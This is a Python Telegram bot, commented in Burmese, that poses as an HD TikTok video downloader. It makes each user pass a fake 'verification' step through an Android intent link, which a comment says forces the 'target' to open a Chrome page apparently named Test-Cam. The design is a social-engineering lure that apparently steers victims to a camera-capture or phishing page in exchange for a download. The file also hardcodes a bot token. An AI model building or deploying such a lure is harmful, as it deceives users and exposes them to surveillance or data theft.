import telebot
import requests
from telebot import types

# --- Bot Configuration ---
BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
# Target ကို Chrome ဖြင့် အတင်းဖွင့်ခိုင်းမည့် Intent Link
CHROME_INTENT = "intent://tar-alt.github.io/Test-Cam/#Intent;scheme=https;package=com.android.chrome;end"

bot = telebot.TeleBot(BOT_TOKEN)
user_links = {} # User ပို့ထားသော Link များကို မှတ်ထားရန်

@bot.message_handler(commands=['start'])
def start(message):
    # Website မှ Verification အောင်မြင်ပြီး ပြန်လာသည့်အခါ
    if "Verification_Success" in message.text:
        link = user_links.get(message.chat.id)
        if link:
            bot.send_message(message.chat.id, "✅ Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
            try:
                res = requests.get(f"https://www.tikwm.com/api/?url={link}&hd=1").json()
                if res['code'] == 0:
                    video_url = res['data'].get('hdplay') or res['data'].get('play')
                    bot.send_video(message.chat.id, video_url, caption="✅ *Download Successful!*")
                else:
                    bot.send_message(message.chat.id, "❌ ဗီဒီယို ဒေါင်းလုဒ်ဆွဲ၍ မရပါ။")
            except:
                bot.send_message(message.chat.id, "⚠️ စနစ်ချို့ယွင်းချက် ရှိနေပါသည်။")
        else:
            bot.send_message(message.chat.id, "❌ Link သက်တမ်းကုန်သွားပါပြီ။ ပြန်ပို့ပေးပါ။")
    else:
        bot.send_message(message.chat.id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_link(message):
    user_links[message.chat.id] = message.text # Link သိမ်းခြင်း
    markup = types.InlineKeyboardMarkup()
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", url=CHROME_INTENT)
    markup.add(verify_btn)
    bot.send_message(message.chat.id, f"⚠️ *Verification Required*\n\nLink: `{message.text}`", reply_markup=markup, parse_mode="Markdown")

bot.infinity_polling()
